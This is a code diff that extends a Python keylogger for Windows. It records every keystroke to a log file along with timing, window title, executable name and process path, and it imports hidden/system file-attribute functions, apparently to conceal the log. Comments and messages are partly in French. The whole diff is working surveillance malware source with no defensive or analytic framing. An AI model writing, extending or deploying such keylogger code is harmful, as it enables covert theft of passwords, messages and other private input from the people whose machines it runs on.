@@ -7,9 +7,11 @@
 #╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
 
 import os
-import datetime
-from win32gui import GetForegroundWindow, GetWindowText
+import time
 import keyboard
+import win32gui
+import win32process
+import psutil
 from win32con import FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM
 from win32api import SetFileAttributes
 
@@ -68,63 +70,78 @@ KEY_MAP = {
     "f12": "[F12]",
 }
 
-def get_window_title():
-    hwnd = GetForegroundWindow()
-    window_title = GetWindowText(hwnd)
-    return window_title
+def get_window_details():
+    hwnd = win32gui.GetForegroundWindow()
+    window_title = win32gui.GetWindowText(hwnd)
+
+    if window_title != get_window_details.last_window_title:
+        _, process_id = win32process.GetWindowThreadProcessId(hwnd)
+        process_path = psutil.Process(process_id).exe()
+        executable = os.path.basename(process_path)
+        get_window_details.last_window_title = window_title
+        get_window_details.last_details = (window_title, executable, process_path)
+
+    return get_window_details.last_details
+
+get_window_details.last_window_title = ""
+get_window_details.last_details = ("", "", "")
 
 
 def write_keys(keys_pressed, last_time, file):
-    with open(file, "a") as f:
-        current_time = datetime.datetime.now()
-        time_diff = (current_time - last_time).total_seconds()
-        window_title = get_window_title()
+    with open(file, "a", buffering=1) as f:
+        current_time = time.time()
+        time_diff = current_time - last_time
+        window_title, executable, process_path = get_window_details()
 
         if window_title != write_keys.last_window_title:
-            f.write(f"\n[WINDOW TITLE] -> {window_title}\n")
+            f.write("\n[WINDOW TITLE] -> {} |".format(window_title))
+            f.write(" [EXE] -> {} |".format(executable))
+            f.write(" [PATH] -> {}\n".format(process_path))
             write_keys.last_window_title = window_title
 
         if time_diff >= 1:
-            time_str = f"({int(time_diff)} s)"
+            time_str = "({} s)".format(int(time_diff))
             if time_diff < 2:
-                time_str = f"({int(time_diff * 1000)} ms)"
+                time_str = "({} ms)".format(int(time_diff * 1000))
             if keys_pressed:
-                f.write(f"{time_str} {''.join(keys_pressed)} ")
+                f.write("{} {} ".format(time_str, ''.join(keys_pressed)))
                 keys_pressed.clear()
         else:
             if keys_pressed:
                 f.write(''.join(keys_pressed))
                 keys_pressed.clear()
 
-        f.flush()
-        last_time = current_time
-
-        return last_time
-
 write_keys.last_window_title = ""
 
 def on_press(event):
-    try:
-        keys_pressed = []
-        if event.name in KEY_MAP:
-            keys_pressed.append(KEY_MAP[event.name])
-        elif event.name.isprintable():
-            keys_pressed.append(event.name)
-        global last_time
-        last_time = write_keys(keys_pressed, last_time, log_file)
-    except Exception as e:
-        print(f"Error: {e}")
+    if hasattr(event, 'name'):
+        key = KEY_MAP.get(event.name)
+        if key or event.name.isprintable():
+            keys_pressed = {key} if key else {event.name}
+
+            try:
+                write_keys(keys_pressed, on_press.last_time, log_file)
+            except Exception:
+                pass
+
+            on_press.last_time = time.time()
+
+
+def main():
+    while True:
+        if keyboard.is_pressed('e'):
+            break
+
+    with open(log_file, "a", buffering=1) as f:
+        f.write("\nLancement du script le {} à {}\n".format(
+            time.strftime("%Y-%m-%d", time.localtime()),
+            time.strftime("%H:%M:%S", time.localtime())
+        ))
+
+    on_press.last_time = time.time()
+
+    keyboard.on_press(on_press)
+    keyboard.wait()
 
 if __name__ == "__main__":
-    with open(log_file, "a") as f:
-        f.write(
-            f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n"
-        )
-
-    last_time = datetime.datetime.now()
-    window_title = get_window_title()
-    write_keys.last_window_title = window_title
-
-    on_press_event = on_press
-    keyboard.on_press(on_press_event)
-    keyboard.wait()
+    main()
